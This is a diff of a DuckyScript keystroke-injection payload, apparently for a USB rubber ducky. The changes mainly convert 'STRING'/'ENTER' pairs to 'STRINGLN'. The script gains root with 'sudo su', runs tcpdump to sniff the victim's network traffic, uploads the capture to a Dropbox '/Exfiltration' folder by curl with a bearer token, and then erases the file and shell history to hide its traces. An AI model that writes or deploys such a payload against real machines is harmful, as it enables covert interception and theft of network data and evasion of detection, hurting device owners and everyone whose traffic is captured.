@@ -33,11 +33,9 @@ DELAY 2000
 REM #### PERMISSIONS SECTION ####
 
 
-STRING sudo su
-ENTER
+STRINGLN sudo su
 DELAY 1000
-STRING SUDO_PASS
-ENTER
+STRINGLN SUDO_PASS
 DELAY 1000
 
 
@@ -57,25 +55,21 @@ ENTER
 DELAY 500
 
 REM Network card name
-STRING net_card="$(ip route get 8.8.8.8 | awk '{ print $5; exit }')"
-ENTER
+STRINGLN net_card="$(ip route get 8.8.8.8 | awk '{ print $5; exit }')"
 DELAY 500
 
 REM Network dump
-STRING tcpdump -i "$net_card" $filter_expression -w "$FILE_PATH" &
-ENTER
+STRINGLN tcpdump -i "$net_card" $filter_expression -w "$FILE_PATH" &
 DELAY 500
 
 REM Get PID
-STRING tcpdump_pid=$!
-ENTER
+STRINGLN tcpdump_pid=$!
 
 REM Set how long you want to sniff
 DELAY 60000
 
 REM Kill the process by PID
-STRING kill $tcpdump_pid
-ENTER
+STRINGLN kill $tcpdump_pid
 
 
 REM #### Exfiltrate SECTION ####
@@ -87,8 +81,7 @@ STRING "
 ENTER
 DELAY 500
 
-STRING DROPBOX_FOLDER="/Exfiltration"
-ENTER
+STRINGLN DROPBOX_FOLDER="/Exfiltration"
 DELAY 500
 
 STRING curl -X POST
@@ -97,23 +90,18 @@ STRING --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg:
 ENTER
 
 
-
 REM #### REMOVE TRACES ####
 
 
-STRING rm "$FILE_PATH"
-ENTER
+STRINGLN rm "$FILE_PATH"
 DELAY 500
 
-STRING history -c
-ENTER
+STRINGLN history -c
 DELAY 500
 
 REM Exit from Sudo user
-STRING exit
-ENTER
+STRINGLN exit
 DELAY 500
 
 REM Close the shell
-STRING exit
-ENTER
+STRINGLN exit
